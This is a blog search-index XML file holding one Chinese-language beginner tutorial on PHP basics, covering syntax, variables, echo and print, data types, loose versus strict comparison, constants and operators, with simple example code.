<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PHP基础（掌握点）</title>
    <url>/2023/04/21/PHP%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="PHP-是一种创建动态交互性站点的强有力的服务器端脚本语言"><a href="#PHP-是一种创建动态交互性站点的强有力的服务器端脚本语言" class="headerlink" title="PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言"></a>PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言</h2><h2 id="PHP-是什么？"><a href="#PHP-是什么？" class="headerlink" title="PHP 是什么？"></a>PHP 是什么？</h2><ul>
<li>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。</li>
<li>PHP 脚本在服务器上执行。</li>
<li>PHP 可免费下载使用。</li>
</ul>
<h2 id="PHP-文件是什么？"><a href="#PHP-文件是什么？" class="headerlink" title="PHP 文件是什么？"></a>PHP 文件是什么？</h2><ul>
<li>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码</li>
<li>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器</li>
<li>PHP 文件的默认文件扩展名是 “.php”</li>
</ul>
<h2 id="PHP-能做什么？"><a href="#PHP-能做什么？" class="headerlink" title="PHP 能做什么？"></a>PHP 能做什么？</h2><ul>
<li>PHP 可以生成动态页面内容</li>
<li>PHP 可以创建、打开、读取、写入、关闭服务器上的文件</li>
<li>PHP 可以收集表单数据</li>
<li>PHP 可以发送和接收 cookies</li>
<li>PHP 可以添加、删除、修改您的数据库中的数据</li>
<li>PHP 可以限制用户访问您的网站上的一些页面</li>
<li>PHP 可以加密数据</li>
</ul>
<h2 id="为什么使用-PHP？"><a href="#为什么使用-PHP？" class="headerlink" title="为什么使用 PHP？"></a>为什么使用 PHP？</h2><ul>
<li>PHP 可在不同的平台上运行（Windows、Linux、Unix、Mac OS X 等）</li>
<li>PHP 与目前几乎所有的正在被使用的服务器相兼容（Apache、IIS 等）</li>
<li>PHP 提供了广泛的数据库支持</li>
<li>PHP 易于学习，并可高效地运行在服务器端</li>
</ul>
<h2 id="PHP语法"><a href="#PHP语法" class="headerlink" title="PHP语法"></a>PHP语法</h2><p>PHP 脚本可以放在文档中的任何位置。</p>
<p>PHP 脚本以 <strong><?php** 开始，以 **?></strong> 结束：</p>
<p>PHP 文件的默认文件扩展名是 “.php”。</p>
<p>PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>My first PHP page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">echo &quot;Hello World!&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>PHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。</p>
<p>通过 PHP，有两种在浏览器输出文本的基础指令：<strong>echo</strong> 和 <strong>print</strong>。</p>
<h2 id="PHP-注释"><a href="#PHP-注释" class="headerlink" title="PHP 注释"></a>PHP 注释</h2><ul>
<li>&#x2F;&#x2F;      单行注释</li>
<li>&#x2F;*  *&#x2F;   多行注释</li>
</ul>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">// 这是 PHP 单行注释</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">/*</span></span><br><span class="line"><span class="meta">这是</span></span><br><span class="line"><span class="meta">PHP 多行</span></span><br><span class="line"><span class="meta">注释</span></span><br><span class="line"><span class="meta">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量是用于存储信息的”容器”</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">6</span>;</span><br><span class="line"><span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$z</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<p><strong>PHP 变量规则</strong></p>
<ul>
<li>变量以 $ 符号开始，后面跟着变量的名称</li>
<li>变量名必须以字母或者下划线字符开始</li>
<li>变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）</li>
<li>变量名不能包含空格</li>
<li>变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</li>
</ul>
<h2 id="创建PHP变量"><a href="#创建PHP变量" class="headerlink" title="创建PHP变量"></a>创建PHP变量</h2><p>PHP 没有声明变量的命令。</p>
<p>变量在您第一次赋值给它的时候被创建</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$txt</span>=<span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line"><span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">10.5</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>在上面的语句执行中，变量 <strong>txt</strong> 将保存值 **Hello world!**，且变量 <strong>x</strong> 将保存值 <strong>5</strong>。</p>
<p><strong>注释：</strong>当您赋一个文本值给变量时，请在文本值两侧加上引号。</p>
<h2 id="PHP-是一门弱类型语言"><a href="#PHP-是一门弱类型语言" class="headerlink" title="PHP 是一门弱类型语言"></a>PHP 是一门弱类型语言</h2><p>PHP 会根据变量的值，自动把变量转换为正确的数据类型。</p>
<p>在强类型的编程语言中，我们必须在使用变量前先声明（定义）变量的类型和名称。</p>
<h1 id="echo-和-print-语句"><a href="#echo-和-print-语句" class="headerlink" title="echo 和 print 语句"></a>echo 和 print 语句</h1><p>echo 和 print 区别:</p>
<ul>
<li>echo - 可以输出一个或多个字符串</li>
<li>print - 只允许输出一个字符串，返回值总为 1</li>
</ul>
<p><strong>提示：</strong>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</p>
<p>echo 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()。</p>
<p><strong>显示字符串</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;PHP 很有趣!&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello world!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我要学 PHP!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;这是一个&quot;</span>, <span class="string">&quot;字符串，&quot;</span>, <span class="string">&quot;使用了&quot;</span>, <span class="string">&quot;多个&quot;</span>, <span class="string">&quot;参数。&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<p><strong>显示变量</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$txt1</span>=<span class="string">&quot;学习 PHP&quot;</span>;</span><br><span class="line"><span class="variable">$txt2</span>=<span class="string">&quot;xbxaq.com&quot;</span>;</span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$txt1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;在 <span class="subst">$txt2</span> 学习 PHP &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我车的品牌是 <span class="subst">&#123;$cars[0]&#125;</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<p>print 同样是一个语言结构，可以使用括号，也可以不使用括号： print 或 print()。</p>
<p><strong>显示字符串</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;h2&gt;PHP 很有趣!&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Hello world!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;我要学习 PHP!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<p><strong>显示变量</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$txt1</span>=<span class="string">&quot;学习 PHP&quot;</span>;</span><br><span class="line"><span class="variable">$txt2</span>=<span class="string">&quot;xbxaq.COM&quot;</span>;</span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="variable">$txt1</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;在 <span class="subst">$txt2</span> 学习 PHP &quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;我车的品牌是 <span class="subst">&#123;$cars[0]&#125;</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><p>PHP 变量存储不同的类型的数据，不同的数据类型可以做不一样的事情。</p>
<p>PHP 支持以下几种数据类型:</p>
<ul>
<li>String（字符串）</li>
<li>Integer（整型）</li>
<li>Float（浮点型）</li>
<li>Boolean（布尔型）</li>
<li>Array（数组）</li>
<li>Object（对象）</li>
<li>NULL（空值）</li>
<li>Resource（资源类型）</li>
</ul>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>一个字符串是一串字符的序列，就像 “Hello world!”。</p>
<p>你可以将任何文本放在单引号和双引号中</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$x</span> = <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;Hello world!&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h2><p>整数是一个没有小数的数字。</p>
<p>整数规则:</p>
<ul>
<li>整数必须至少有一个数字 (0-9)</li>
<li>整数不能包含逗号或空格</li>
<li>整数是没有小数点的</li>
<li>整数可以是正数或负数</li>
<li>整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）。</li>
</ul>
<p>PHP <a class="link"   href="https://www.xbxaq.com/php/php-var_dump-function.html" >var_dump()  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>函数返回变量的数据类型和值</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$x</span> = <span class="number">5985</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line"><span class="variable">$x</span> = -<span class="number">345</span>; <span class="comment">// 负数 </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line"><span class="variable">$x</span> = <span class="number">0x8C</span>; <span class="comment">// 十六进制数</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="number">047</span>; <span class="comment">// 八进制数</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h2><p>浮点数是带小数部分的数字，或是指数形式</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$x</span> = <span class="number">10.365</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line"><span class="variable">$x</span> = <span class="number">2.4e3</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line"><span class="variable">$x</span> = <span class="number">8E-5</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h2><p>布尔型可以是 TRUE 或 FALSE</p>
<p>布尔型通常用于条件判断</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>数组可以在一个变量中存储多个值</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cars</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>对象数据类型也可以用于存储数据。</p>
<p>在 PHP 中，对象必须声明。</p>
<p>首先，你必须使用class关键字声明类对象。类是可以包含属性和方法的结构。</p>
<p>然后我们在类中定义数据类型，然后在实例化的类中使用数据类型</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$color</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$color</span>=<span class="string">&quot;green&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;color = <span class="variable">$color</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">what_color</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;color;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="NULL-值"><a href="#NULL-值" class="headerlink" title="NULL 值"></a>NULL 值</h2><p>NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。</p>
<p>NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。</p>
<p>可以通过设置变量值为 NULL 来清空变量数据</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line"><span class="variable">$x</span>=<span class="literal">null</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="类型比较"><a href="#类型比较" class="headerlink" title="类型比较"></a>类型比较</h1><p>虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较。</p>
<ul>
<li>松散比较：使用两个等号 <strong>&#x3D;&#x3D;</strong> 比较，只比较值，不比较类型。</li>
<li>严格比较：用三个等号 <strong>&#x3D;&#x3D;&#x3D;</strong> 比较，除了比较值，也比较类型。</li>
</ul>
<p>例如，”42” 是一个字符串而 42 是一个整数。<strong>FALSE</strong> 是一个布尔值而 <strong>“FALSE”</strong> 是一个字符串。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="number">42</span> == <span class="string">&quot;42&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;1、值相等&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> PHP_EOL; <span class="comment">// 换行符</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="number">42</span> === <span class="string">&quot;42&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;2、类型相等&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;3、类型不相等&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="PHP中-比较-0、false、null"><a href="#PHP中-比较-0、false、null" class="headerlink" title="PHP中 比较 0、false、null"></a>PHP中 比较 0、false、null</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;0 == false: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0</span> == <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;0 === false: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0</span> === <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;0 == null: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0</span> == <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;0 === null: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0</span> === <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;false == null: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">false</span> == <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;false === null: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">false</span> === <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;0&quot; == false: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0&quot;</span> == <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;0&quot; === false: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0&quot;</span> === <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;0&quot; == null: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0&quot;</span> == <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;0&quot; === null: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0&quot;</span> === <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&quot; == false: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;&quot;</span> == <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&quot; === false: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;&quot;</span> === <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&quot; == null: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;&quot;</span> == <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&quot; === null: &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;&quot;</span> === <span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>



<h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>常量值被定义后，在脚本的其他任何地方都不能被改变</p>
<p>常量是一个简单值的标识符。该值在脚本中不能改变。</p>
<p>一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符)。</p>
<p><strong>注意：</strong> 常量在整个脚本中都可以使用。</p>
<p>设置常量，使用 define() 函数，函数语法如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )</span><br></pre></td></tr></table></figure></div>

<p>该函数有三个参数:</p>
<ul>
<li><strong>name：</strong>必选参数，常量名称，即标志符。</li>
<li><strong>value：</strong>必选参数，常量的值。</li>
<li><strong>case_insensitive</strong> ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</li>
</ul>
<p>创建一个 <strong>区分大小写的常量</strong>, 常量值为 “欢迎访问 xbxaq.com”</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 区分大小写的常量名</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;GREETING&quot;</span>, <span class="string">&quot;欢迎访问 xbxaq.com&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> GREETING;    <span class="comment">// 输出 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> greeting;   <span class="comment">// 输出 &quot;greeting&quot;，但是有警告信息，表示该常量未定义</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p> PHP 中，赋值运算符 <strong>&#x3D;</strong> 用于给变量赋值。</p>
<p>在 PHP 中，算术运算符 <strong>+</strong> 用于把值加在一起。</p>
<h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$x</span>=<span class="number">10</span>; </span><br><span class="line"><span class="variable">$y</span>=<span class="number">6</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$x</span> + <span class="variable">$y</span>); <span class="comment">// 输出16</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;  <span class="comment">// 换行</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$x</span> - <span class="variable">$y</span>); <span class="comment">// 输出4</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;  <span class="comment">// 换行</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$x</span> * <span class="variable">$y</span>); <span class="comment">// 输出60</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;  <span class="comment">// 换行</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$x</span> / <span class="variable">$y</span>); <span class="comment">// 输出1.6666666666667</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;  <span class="comment">// 换行</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$x</span> % <span class="variable">$y</span>); <span class="comment">// 输出4</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;  <span class="comment">// 换行</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> -<span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$x</span>=<span class="number">10</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>; <span class="comment">// 输出10</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$y</span>=<span class="number">20</span>; </span><br><span class="line"><span class="variable">$y</span> += <span class="number">100</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>; <span class="comment">// 输出120</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$z</span>=<span class="number">50</span>;</span><br><span class="line"><span class="variable">$z</span> -= <span class="number">25</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$z</span>; <span class="comment">// 输出25</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$i</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$i</span> *= <span class="number">6</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>; <span class="comment">// 输出30</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$j</span>=<span class="number">10</span>;</span><br><span class="line"><span class="variable">$j</span> /= <span class="number">5</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$j</span>; <span class="comment">// 输出2</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$k</span>=<span class="number">15</span>;</span><br><span class="line"><span class="variable">$k</span> %= <span class="number">4</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$k</span>; <span class="comment">// 输出3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



